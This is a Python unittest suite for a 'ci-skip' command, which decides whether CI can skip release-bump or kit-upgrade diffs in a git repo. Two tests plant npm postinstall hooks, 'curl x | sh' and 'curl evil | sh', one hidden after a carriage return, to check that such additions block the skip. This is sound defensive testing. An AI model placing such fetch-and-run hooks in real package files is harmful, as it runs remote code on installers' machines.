#!/usr/bin/env python3
"""Tests for ci_skip.py: the `ci-skip` command, may CI skip a release or kit upgrade diff."""

from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEVLOOP = HERE.parents[2] / "skill" / "scripts" / "devloop.py"
GIT = ["git", "-c", "user.email=t@example.invalid", "-c", "user.name=t", "-c", "init.defaultBranch=main"]

CHANGELOG = "# Changelog\n\n## [2.1.1] - 2026-10-16\n\n- First.\n"
RELEASED = "# Changelog\n\n## [2.2.0] - 2026-11-01\n\n- New.\n\n## [2.1.1] - 2026-10-16\n\n- First.\n"
KIT_A = ".agents/skills/x/SKILL.md"
KIT_B = ".agents/skills/x/ref.md"


def package(version: str = "2.1.1", lodash: str = "4.17.20", extra: str = "") -> str:
    return (f'{{\n  "name": "x",\n  "version": "{version}",\n{extra}  "dependencies": {{\n'
            f'    "lodash": "{lodash}"\n  }}\n}}\n')


def config(**fields) -> str:
    return json.dumps({"version": "2.1.1", "version_files": ["package.json"], **fields}, indent=2) + "\n"


def sha256(text: str) -> str:
    return "sha256:" + hashlib.sha256(text.encode()).hexdigest()


def manifest(version: str, files: dict[str, str]) -> str:
    return json.dumps({"version": version, "files": {p: sha256(c) for p, c in files.items()}}, indent=2) + "\n"


BASE = {
    "CHANGELOG.md": CHANGELOG,
    "package.json": package(),
    "dev-loop.json": config(),
    KIT_A: "a1\n",
    KIT_B: "b1\n",
    ".dev-loop/MANIFEST.json": manifest("2.1.1", {KIT_A: "a1\n", KIT_B: "b1\n"}),
}
RELEASE = {"CHANGELOG.md": RELEASED, "package.json": package("2.2.0")}
UPGRADE = {
    KIT_A: "a2\n",
    KIT_B: "b2\n",
    ".dev-loop/MANIFEST.json": manifest("2.2.0", {KIT_A: "a2\n", KIT_B: "b2\n"}),
    "dev-loop.json": config(version="2.2.0"),
}


class CiSkipTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp_dir.cleanup)
        self.tmp = Path(self.tmp_dir.name)
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        self.git("init", "-q")

    def git(self, *args: str) -> str:
        return subprocess.run([*GIT, "-C", str(self.repo), *args], capture_output=True, text=True, check=True).stdout.strip()

    def commit(self, files: dict[str, str | bytes | None]) -> str:
        for name, text in files.items():
            path = self.repo / name
            if text is None:
                path.unlink()
            else:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(text if isinstance(text, bytes) else text.encode())
        self.git("add", "-A")
        self.git("commit", "-q", "--allow-empty", "-m", "c")
        return self.git("rev-parse", "HEAD")

    def check(self, head: dict[str, str | None], base: dict[str, str | None] | None = None, *args: str,
              env: dict[str, str] | None = None) -> tuple[int, dict]:
        self.base = self.commit({**BASE, **(base or {})})
        self.head = self.commit(head)
        return self.run_skip("--base", self.base, *args, env=env)

    def run_skip(self, *args: str, repo: Path | None = None, env: dict[str, str] | None = None) -> tuple[int, dict]:
        done = subprocess.run([sys.executable, str(DEVLOOP), "ci-skip", "--repo", str(repo or self.repo), *args],
                              capture_output=True, text=True, env=env or {k: v for k, v in os.environ.items() if k != "GITHUB_OUTPUT"})
        return done.returncode, json.loads(done.stdout)

    def test_release_diff_skips(self) -> None:
        code, out = self.check(RELEASE)
        self.assertEqual((code, out), (0, {"skip": True, "kind": "release", "blocking": [], "base": self.base, "head": self.head}))

    def test_code_next_to_release_blocks(self) -> None:
        code, out = self.check({**RELEASE, "src/app.py": "x = 1\n"})
        self.assertEqual((code, out["skip"], out["kind"], out["blocking"]), (0, False, None, ["src/app.py"]))

    def test_dependency_next_to_version_blocks(self) -> None:
        _, out = self.check({**RELEASE, "package.json": package("2.2.0", "4.17.21")})
        self.assertFalse(out["skip"])
        self.assertIn("package.json", out["blocking"])

    def test_dependency_alone_blocks(self) -> None:
        _, out = self.check({"package.json": package(lodash="4.17.21")})
        self.assertFalse(out["skip"])

    def test_version_must_match_changelog(self) -> None:
        _, out = self.check({**RELEASE, "package.json": package("2.3.0")})
        self.assertFalse(out["skip"])

    def test_added_line_blocks(self) -> None:
        _, out = self.check({**RELEASE, "package.json": package("2.2.0", extra='  "postinstall": "curl x | sh",\n')})
        self.assertFalse(out["skip"])

    def test_unlisted_version_file_blocks(self) -> None:
        _, out = self.check({**RELEASE, "pyproject.toml": 'version = "2.2.0"\n'}, {"pyproject.toml": 'version = "2.1.1"\n'})
        self.assertEqual((out["skip"], out["blocking"]), (False, ["pyproject.toml"]))

    def test_kit_upgrade_skips(self) -> None:
        _, out = self.check(UPGRADE)
        self.assertEqual((out["skip"], out["kind"], out["blocking"]), (True, "kit-upgrade", []))

    def test_commands_change_blocks(self) -> None:
        _, out = self.check({**UPGRADE, "dev-loop.json": config(version="2.2.0", commands={"gate": "true"})})
        self.assertFalse(out["skip"])
        self.assertIn("dev-loop.json", out["blocking"])

    def test_manifest_key_outside_kit_roots_blocks(self) -> None:
        files = {KIT_A: "a2\n", KIT_B: "b2\n", "src/app.py": "x = 2\n"}
        _, out = self.check({**UPGRADE, "src/app.py": "x = 2\n", ".dev-loop/MANIFEST.json": manifest("2.2.0", files)},
                            {"src/app.py": "x = 1\n"})
        self.assertEqual((out["skip"], out["blocking"]), (False, ["src/app.py"]))

    def test_merged_config_blocks(self) -> None:
        _, out = self.check({**UPGRADE, ".claude/settings.json": "{}\n"})
        self.assertFalse(out["skip"])
        self.assertIn(".claude/settings.json", out["blocking"])

    def test_deleted_kit_copy_allowed(self) -> None:
        _, out = self.check({KIT_B: None, ".dev-loop/MANIFEST.json": manifest("2.2.0", {KIT_A: "a1\n"}),
                             "dev-loop.json": config(version="2.2.0")})
        self.assertEqual((out["skip"], out["blocking"]), (True, []))

    def test_release_and_upgrade_together(self) -> None:
        _, out = self.check({**RELEASE, **UPGRADE})
        self.assertEqual((out["skip"], out["kind"]), (True, "release"))

    def test_no_change(self) -> None:
        self.base = self.commit(BASE)
        code, out = self.run_skip("--base", self.base)
        self.assertEqual((code, out["skip"], out["kind"], out["blocking"]), (0, False, None, []))

    def test_unresolved_base(self) -> None:
        self.commit(BASE)
        code, out = self.run_skip("--base", "0" * 40)
        self.assertEqual(code, 1)
        self.assertIn("error", out)

    def test_github_output(self) -> None:
        target = self.tmp / "github-output"
        target.write_text("other=1\n")
        env = {**os.environ, "GITHUB_OUTPUT": str(target)}
        self.check(RELEASE, None, "--github-output", env=env)
        self.assertTrue(target.read_text().endswith("other=1\nskip=true\n"))
        code, _ = self.run_skip("--base", self.base, "--head", self.commit({"src/app.py": "x\n"}), "--github-output", env=env)
        self.assertEqual((code, target.read_text().endswith("skip=true\nskip=false\n")), (0, True))
        code, out = self.run_skip("--base", self.base, "--github-output")
        self.assertEqual(code, 2)
        self.assertIn("error", out)

    def test_version_files_string_is_error(self) -> None:
        code, out = self.check({**RELEASE, "dev-loop.json": json.dumps({"version": "2.1.1", "version_files": "package.json"})})
        self.assertEqual(code, 1)
        self.assertIn("error", out)

    def test_hand_edited_kit_copy_blocks(self) -> None:
        _, out = self.check({**UPGRADE, KIT_B: "b2 edited\n"})
        self.assertEqual((out["skip"], out["blocking"]), (False, [KIT_B]))

    def test_kit_hashes_without_version_change_block(self) -> None:
        _, out = self.check({**UPGRADE, ".dev-loop/MANIFEST.json": manifest("2.1.1", {KIT_A: "a2\n", KIT_B: "b2\n"})})
        self.assertFalse(out["skip"])

    def test_moved_base_uses_the_merge_base(self) -> None:
        point = self.commit(BASE)
        self.git("checkout", "-q", "-b", "release")
        head = self.commit(RELEASE)
        self.git("checkout", "-q", "main")
        main = self.commit({"src/app.py": "x = 1\n"})
        self.assertNotEqual(point, main)
        _, out = self.run_skip("--base", main, "--head", head)
        self.assertEqual((out["skip"], out["blocking"]), (True, []))

    def test_two_version_lines_one_pair(self) -> None:
        lock = '{{\n  "name": "x",\n  "version": "{0}",\n  "packages": {{\n    "": {{\n      "version": "{0}"\n    }}\n  }}\n}}\n'
        _, out = self.check({**RELEASE, "package-lock.json": lock.format("2.2.0")},
                            {"package-lock.json": lock.format("2.1.1"),
                             "dev-loop.json": config(version_files=["package.json", "package-lock.json"])})
        self.assertEqual((out["skip"], out["blocking"]), (True, []))

    def test_raw_bytes_in_version_file_block(self) -> None:
        cases = {
            "carriage return": (b'{\n  "version": "2.1.1",\n  "name": "x"\n}\n',
                                b'{\n  "version": "2.2.0",\r  "scripts": {"postinstall": "curl evil | sh"},\n  "name": "x"\n}\n'),
            "not utf-8": (b'{\n  "version": "2.1.1",\n  "name": "\xff"\n}\n', b'{\n  "version": "2.2.0",\n  "name": "\xfe"\n}\n'),
            "nul placeholder": (b'{\n  "version": "2.1.1",\n  "x": "1.0.0"\n}\n', b'{\n  "version": "2.2.0",\n  "x": "\x00"\n}\n'),
        }
        for name, (old, new) in cases.items():
            with self.subTest(name):
                self.setUp()
                code, out = self.check({"CHANGELOG.md": RELEASED, "package.json": new}, {"package.json": old})
                self.assertEqual((code, out["skip"], "package.json" in out["blocking"]), (0, False, True))

    def test_no_version_heading_blocks_version_files(self) -> None:
        _, out = self.check({**RELEASE, "CHANGELOG.md": "# Changelog\n\n## [Unreleased]\n\n- New.\n\n" + CHANGELOG[13:]})
        self.assertFalse(out["skip"])
        self.assertIn("package.json", out["blocking"])

    def test_not_a_git_repo(self) -> None:
        empty = self.tmp / "empty"
        empty.mkdir()
        env = {**os.environ, "GIT_CEILING_DIRECTORIES": str(self.tmp)}
        code, out = self.run_skip("--base", "HEAD", repo=empty, env=env)
        self.assertEqual(code, 1)
        self.assertIn("error", out)


if __name__ == "__main__":
    unittest.main()
